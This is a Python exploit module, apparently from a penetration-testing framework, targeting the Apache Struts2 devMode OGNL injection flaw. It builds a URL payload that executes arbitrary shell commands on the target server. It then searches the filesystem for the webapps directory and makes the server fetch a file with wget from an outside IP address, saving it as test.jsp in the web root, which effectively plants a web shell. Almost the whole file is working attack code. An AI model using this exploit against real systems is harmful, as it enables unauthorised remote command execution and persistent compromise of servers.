# coding:utf-8
import sys
import re
from exp_template import Exploit, Level, session

"""
构造函数需要传递以下参数
url   测试目标的url
exp需要实现的方法为meta_info和exploit
create by swm  2018/06/28
done:
获取webpath
执行shell命令，无法执行echo命令写文件
can do:
执行wget下载文件，下载大文件都行
"""


class S2DEVMODE(Exploit):

    def meta_info(self):
        return {
            'name': 'S2DEVMODE',
            'author': 'swm',
            'date': '2018/06/28'
        }

    def executecmd(self, cmd):
        cmdexp = "/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context" \
                 "[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lan" \
                 "g.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpso" \
                 "bj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command={}"
        commandurl = self.url+cmdexp.format(cmd)
        s = session()
        try:
            r = s.get(commandurl, timeout=5)
            resp = r.text.encode("utf-8")
            return resp
        except:
            return False

    # 获取web文件的路径
    def getwebpath(self):
        cmd = 'find / -name *.jsp'
        re_webpath = re.compile(r'.+webapps\/\w+\/')
        str = self.executecmd(cmd)
        webpath = re_webpath.search(str)
        if webpath:
            return webpath.group()
        else:
            self.report('Canot find webpath', Level.error)
            return False

    def wgetfile(self, serverurl, filepath):
        cmd = ''' wget {} -O {}test.jsp'''.format(serverurl, filepath)
        response = self.executecmd(cmd)
        return response

    def exploit(self):
        if self.url == '' or (not self.url.startswith('http://') and not self.url.startswith('https://')):
            self.report('url error', Level.error)
            return
        # 获取webapp的根目录
        webpath = self.getwebpath()
        if webpath:
            serverurl = '''http://172.22.209.33:8014/api/download'''
            res = self.wgetfile(serverurl, webpath)
            if res:
                self.report('wget file {}'.format(res), Level.info)
        return True


if __name__ == '__main__':
    if len(sys.argv) == 2:
        s = S2DEVMODE(sys.argv[1])
        res = s.exploit()
        print res
